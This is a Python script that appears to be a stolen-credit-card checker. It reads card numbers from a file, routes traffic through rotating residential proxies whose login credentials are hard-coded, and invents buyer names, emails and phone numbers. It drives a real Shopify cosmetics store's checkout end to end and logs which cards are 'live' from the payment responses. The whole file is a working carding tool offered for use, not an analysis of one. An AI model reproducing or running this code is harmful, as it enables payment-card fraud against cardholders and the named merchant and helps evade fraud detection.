from faker import Faker
import base64, random, requests, re, sys, traceback, time
from py_adyen_encrypt import encryptor
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

from colorama import Fore

rojo = Fore.RED
stop = Fore.RESET
verde = Fore.GREEN
amarillo = Fore.YELLOW
cyan = Fore.CYAN
magenta = Fore.MAGENTA



class Shopify():

	def find_between( data, first, last ):
		try:
			start = data.index( first ) + len( first )
			end = data.index( last, start )
			return data[start:end]
		except ValueError:
			return None


	def shp(text):
			
		try:
			

			curl = requests.Session()
			proxyss = [
			"brd-customer-hl_c72831a4-zone-isp-ip-154.17.65.113:yuupvzsn1wvr@zproxy.lum-superproxy.io:22225",
			"brd-customer-hl_c72831a4-zone-isp-ip-45.91.236.154:yuupvzsn1wvr@zproxy.lum-superproxy.io:22225",
			"brd-customer-hl_c72831a4-zone-isp-ip-185.185.147.162:yuupvzsn1wvr@zproxy.lum-superproxy.io:22225",
			"brd-customer-hl_c72831a4-zone-isp-ip-45.130.212.232:yuupvzsn1wvr@zproxy.lum-superproxy.io:22225",
			"brd-customer-hl_c72831a4-zone-isp-ip-45.91.236.144:yuupvzsn1wvr@zproxy.lum-superproxy.io:22225",
			"brd-customer-hl_c72831a4-zone-isp-ip-178.171.104.193:yuupvzsn1wvr@zproxy.lum-superproxy.io:22225",
			"brd-customer-hl_c72831a4-zone-isp-ip-91.108.223.213:yuupvzsn1wvr@zproxy.lum-superproxy.io:22225",
			"brd-customer-hl_c72831a4-zone-isp-ip-31.204.12.99:yuupvzsn1wvr@zproxy.lum-superproxy.io:22225",
			"brd-customer-hl_c72831a4-zone-isp-ip-45.132.176.105:yuupvzsn1wvr@zproxy.lum-superproxy.io:22225",
			"brd-customer-hl_c72831a4-zone-isp-ip-45.91.236.74:yuupvzsn1wvr@zproxy.lum-superproxy.io:22225"]


			proxx = random.choice(proxyss)
			curl.proxies =  {'http': f'http://{proxx}',
           'https': f'http://{proxx}'}
			
			


			fake = Faker()
			name = fake.first_name()
			second = fake.last_name()
			Ncorreo = str(random.randint(111, 9999))
			num4 = str(random.randint(1000, 9999))
			email = (name+second+Ncorreo+'@gmail.com').lower()

			cc0 = re.findall('[0-9]+', text)
			cc1 = cc0[0]
			mes1 = cc0[1]
			ano1 = cc0[2]
			cvv1 = cc0[3]

			if mes1 == '00' or mes1 == '0':
				mes1 = str(random.randint(1, 12))
			if len(ano1) == 2:
				ano1 = '20'+ano1
			if len(mes1) == 1:
				mes1 = mes1
			else:
				mes1 = mes1[1:2]

			if len(cvv1) == 4:
				if str(cc1).startswith('3'):
					cvv1 = cvv1
					
				else:
					cvv1 = cvv1[:3]

					


			if str(cc1).startswith('3'):
				cc11 = cc1[0:4]
				cc22 = cc1[4:10]
				cc33 = cc1[10:15]
				ccr = f'{cc11} {cc22} {cc33}'
					
			else:
	
				cc11 = cc1[0:4]
				cc22 = cc1[4:8]
				cc33 = cc1[8:12]
				cc44 = cc1[12:16]
				ccr = f'{cc11} {cc22} {cc33} {cc44}'


			tarjeta = cc1+"|"+mes1+"|"+ano1+"|"+cvv1
			

			
			r1 = curl.get('https://www.beautycreationscosmetics.com/collections/new-arrivals/products/stay-cool-handheld-fan-purple')
			variantId = Shopify.find_between(r1.text, 'variantId":',',')
			if not variantId:
				print('No variante id')
				return
			
			
			headers = {
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'content-type': 'application/json, application/json',
			'origin': 'https://www.beautycreationscosmetics.com',
			'referer': 'https://www.beautycreationscosmetics.com/collections/new-arrivals/products/stay-cool-handheld-fan-purple',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
			}
			data = {"form_type":"product","utf8":"✓","id":variantId,"quantity":"1","discount":" "}
			r2 = curl.post('https://www.beautycreationscosmetics.com/cart/add.js', headers=headers, json=data)
			
			
			headers = {
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"content-type": "application/x-www-form-urlencoded",
			"origin": "https://www.beautycreationscosmetics.com",
			"referer": "https://www.beautycreationscosmetics.com/cart",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
			}
			data = {
			"updates[]": "1",
			"note": "",
			"checkout": "Check Out",
			"discount": "", 
			}
			r12 = curl.post('https://www.beautycreationscosmetics.com/cart', headers=headers, data=data)
			#print(curl.get('http://lumtest.com/myip.json').json()['ip'])
			ur = (r12.url)
			url = (ur[:-10])
			id1 = ur[41:49]
			id2 = url[60:]
			
			
			r13 = curl.get(url)
			soup = BeautifulSoup(r13.text, 'html.parser')
			div_tag = soup.find('div', {'class': 'step'})
			auth_token = div_tag.find('input', {'name': 'authenticity_token'}).get('value')
			if not auth_token:
				with open('auth_token.html', 'w') as f: f.write(r13.text)
				print(rojo+f'{tarjeta} --> No token'+stop)
				return
			
			headers = {
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"Content-Type": "application/x-www-form-urlencoded",
			"Host": "www.beautycreationscosmetics.com",
			"Origin": "https://www.beautycreationscosmetics.com",
			"Referer": "https://www.beautycreationscosmetics.com/",
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
			}
			data = {
			"_method": "patch",
			"authenticity_token": auth_token,
			"previous_step": "contact_information",
			"step": "shipping_method",
			"checkout[email]": email,
			"checkout[buyer_accepts_marketing]": "0",
			"checkout[buyer_accepts_marketing]": "1",
			"checkout[pick_up_in_store][selected]": "false",
			"checkout[id]": "delivery-shipping",
			"checkout[shipping_address][first_name]": "",
			"checkout[shipping_address][last_name]": "",
			"checkout[shipping_address][company]": "",
			"checkout[shipping_address][address1]": "",
			"checkout[shipping_address][address2]": "",
			"checkout[shipping_address][city]": "",
			"checkout[shipping_address][country]": "",
			"checkout[shipping_address][province]": "",
			"checkout[shipping_address][zip]": "",
			"checkout[shipping_address][phone]": "",
			"checkout[shipping_address][country]": "United States",
			"checkout[shipping_address][first_name]": name,
			"checkout[shipping_address][last_name]": second,
			"checkout[shipping_address][company]": "",
			"checkout[shipping_address][address1]": "8241 Northwest 66th Street",
			"checkout[shipping_address][address2]": "",
			"checkout[shipping_address][city]": "Miami",
			"checkout[shipping_address][province]": "FL",
			"checkout[shipping_address][zip]": "33166",
			"checkout[shipping_address][phone]": "(306) 363-"+num4,
			"checkout[client_details][browser_width]": "858",
			"checkout[client_details][browser_height]": "781",
			"checkout[client_details][javascript_enabled]": "1",
			"checkout[client_details][color_depth]": "24",
			"checkout[client_details][java_enabled]": "false",
			"checkout[client_details][browser_tz]": "0",
			}
			r14 = curl.post(url, headers=headers, data=data)
			url2 = r14.url
			
			
			
			r15 = curl.get(url2)
			soup = BeautifulSoup(r15.text, 'html.parser')
			div_tag = soup.find('div', {'class': 'step'})
			auth_token2 = div_tag.find('input', {'name': 'authenticity_token'}).get('value')
			if not auth_token2:
				with open('auth_token2.html', 'w') as f: f.write(r15.text)
				print(rojo+f'{tarjeta} --> No token2'+stop)
				return
			
			
			
			headers = {
			'Accept': '*/*',
			'Host': 'www.beautycreationscosmetics.com',
			'Referer': 'https://www.beautycreationscosmetics.com/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
			'X-Requested-With': 'XMLHttpRequest',
			}
			r16 = curl.get(url+'/shipping_rates?step=shipping_method', headers=headers)
			enc = str(r16.text.encode('utf-8'))
			shipping = Shopify.find_between(r16.text, 'data-shipping-method="','"')
			
			
			
			
			headers = {
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"Content-Type": "application/x-www-form-urlencoded",
			"Host": "www.beautycreationscosmetics.com",
			"Origin": "https://www.beautycreationscosmetics.com",
			"Referer": "https://www.beautycreationscosmetics.com/",
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
			}
			data = {
			"_method": "patch",
			"authenticity_token": auth_token2,
			"previous_step": "shipping_method",
			"step": "payment_method",
			"checkout[shipping_rate][id]": "Easyship-13a2e96c-5c98-48fe-86cb-c27d7a3dc2e8;DDU-4.53" if not shipping else shipping,
			"checkout[client_details][browser_width]": "947",
			"checkout[client_details][browser_height]": "781",
			"checkout[client_details][javascript_enabled]": "1",
			"checkout[client_details][color_depth]": "24",
			"checkout[client_details][java_enabled]": "false",
			"checkout[client_details][browser_tz]": "0",
			}
			r17 = curl.post(url, headers=headers, data=data)
			url3 = r17.url
			
			
			r18 = curl.get(url3)
			auth_token3 = Shopify.find_between(r18.text, 'type="hidden" name="authenticity_token" value="','"')
			if not auth_token3:
				print(rojo+f'{tarjeta} --> No token3'+stop)
				return

			
			r19 = curl.get(url+'?step=payment_method')
			soup = BeautifulSoup(r19.text, 'html.parser')
			div_tag = soup.find('div', {'class': 'step'})
			auth_token4 = div_tag.find('input', {'name': 'authenticity_token'}).get('value')
			if not auth_token4:
				print(rojo+f'{tarjeta} --> No token4'+stop)
				return

			
			
			headers = {
			"Accept": "application/json",
			"Content-Type": "application/json",
			"Host": "deposit.us.shopifycs.com",
			"Origin": "https://checkout.shopifycs.com",
			"Referer": "https://checkout.shopifycs.com/",
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
			}
			data = {"credit_card":{"number":ccr,"name":name+" "+second,"month":int(mes1),"year":int(ano1),"verification_value":str(cvv1)},"payment_session_scope":"www.beautycreationscosmetics.com"}
			
			r20 = curl.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=data)
			id = r20.json()['id']
			
			
			headers = {
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"Content-Type": "application/x-www-form-urlencoded",
			"Host": "www.beautycreationscosmetics.com",
			"Origin": "https://www.beautycreationscosmetics.com",
			"Referer": "https://www.beautycreationscosmetics.com/",
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
			}
			data = {
			"_method": "patch",
			"authenticity_token": auth_token4,
			"previous_step": "payment_method",
			"step": "",
			"s": id,
			"checkout[payment_gateway]": "100636614",
			"checkout[credit_card][vault]": "false",
			"checkout[different_billing_address]": "false",
			"checkout[remember_me]": "false",
			"checkout[remember_me]": "0",
			"checkout[vault_phone]": "+1306363"+num4,
			"checkout[total_price]": "1253",
			"complete": "1",
			"checkout[client_details][browser_width]": "930",
			"checkout[client_details][browser_height]": "781",
			"checkout[client_details][javascript_enabled]": "1",
			"checkout[client_details][color_depth]": "24",
			"checkout[client_details][java_enabled]": "false",
			"checkout[client_details][browser_tz]": "0",
			}
			
			r21 = curl.post(url, headers=headers, data=data)
			auth_token5 = Shopify.find_between(r21.text, 'type="hidden" name="authenticity_token" value="','"')
			if not auth_token5:
				print(rojo+f'{tarjeta} --> No token5'+stop)
				return
			
			
			headers = {
			"Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			"Content-Type": 'application/x-www-form-urlencoded',
			"Host": 'www.beautycreationscosmetics.com',
			"Origin": 'https://www.beautycreationscosmetics.com',
			"Referer": 'https://www.beautycreationscosmetics.com/',
			"User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
			}
			data = {
			"_method": "patch",
			"authenticity_token": auth_token5,
			"checkout[total_price]": "1253",
			"complete": "1",
			"checkout[client_details][browser_width]": "947",
			"checkout[client_details][browser_height]": "781",
			"checkout[client_details][javascript_enabled]": "1",
			"checkout[client_details][color_depth]": "24",
			"checkout[client_details][java_enabled]": "false",
			"checkout[client_details][browser_tz]": "0",
			}
			r22 = curl.post(url, headers=headers, data=data)
			
			
			time.sleep(4)
			r23 = curl.get(url+'/processing')
			with open('shopify23.html', 'w') as f: f.write(r23.text)
			curl.close()

			if 'Your order is confirmed' in r23.text or 'Your order is confirmed' in r23.text or '<div class="webform-confirmation">' in r23.text or 'receive a confirmation email whit your order number' in r23.text or 'ending whit' in r23.text:
					with open('LiveShopifyCVV.txt', 'a') as f: f.write(tarjeta+" "+'Thank you for your purchase!'+"\n")
					print(verde+f'{tarjeta} --> Thank you for your purchase!✅'+stop)
					return

			text1 = Shopify.find_between(r23.text, '<p class="notice__text">','</p></div></div>')
			if not text1:
				if '/3d_secure_2/hosted.js' in r23.text:
					with open('3DSecure.html', 'w') as f: f.write(r23.text)
					print(rojo +f'{tarjeta} --> 3D Secure'+stop)

				elif 'Processing order' in r23.text:
					time.sleep(3)
					text2 = Shopify.find_between(r23.text, '<p class="notice__text">','</p></div></div>')
					if not text2:
						with open('NoNotice.html', 'w') as f: f.write(r23.text)	
						print(rojo +f'{tarjeta} --> TimeOut '+stop)
						return

				else:
					with open('NoNotice.html', 'w') as f: f.write(r23.text)
					print(f'{tarjeta} --> No Notice')
			else:
				with open('ResponseShopify.txt', 'a') as f: f.write(tarjeta+" "+text1+"\n")
				
				if 'Payment gateway is invalid' in text1 or 'ard was declined' in text1 or 'Card number is incorrect' in text1 or 'This transaction cannot be processed.' in text1 or 'This transaction has been declined' in text1 or 'Card number is expired' in text1:
					print(rojo+f'{tarjeta} --> {text1}'+stop)

				elif 'Street address and postal code do not match.' in text1 or 'No Match' in  text1 or 'Security code was not matched by the processor' in  text1:
					with open('LiveShopifyCCN.txt', 'a') as f: f.write(tarjeta+" "+text1+"\n")
					print(verde+f'{tarjeta} --> {text1}'+stop)

				else:
					print(amarillo+f'{tarjeta} --> {text1}'+stop)





		except Exception as detalles:
			if 'ProxyError' in str(detalles):
				print(f'{tarjeta} ---> Proxy Error -->{proxx} --> {detalles} ')
				return
			else:
				exc_type, exc_obj, tb = sys.exc_info() 
				f_name, line_num, func_name, text = traceback.extract_tb(tb)[0] 
				print(f"{tarjeta} Error: {detalles} en la línea {line_num}, Nombre del error: {text}")


if __name__ == '__main__':
	threads = []
	thrd = int(4)
	
	try:
		inpFile ='cc.txt'
		with open(inpFile) as urlList:
			argFile = urlList.read().splitlines()
	except:
		print(rojo+'The file was not found, please create a file called cc.txt in this same folder'+stop)
	else:
		print(verde+'Comenzare a checkear tus ccs, por favor espera...'+stop)
		with ThreadPoolExecutor(max_workers=thrd) as executor:
			for data in argFile:
				threads.append(executor.submit(Shopify.shp, data))
		print(verde+'E terminado de checkear, gracias por usar'+stop)
		quit()
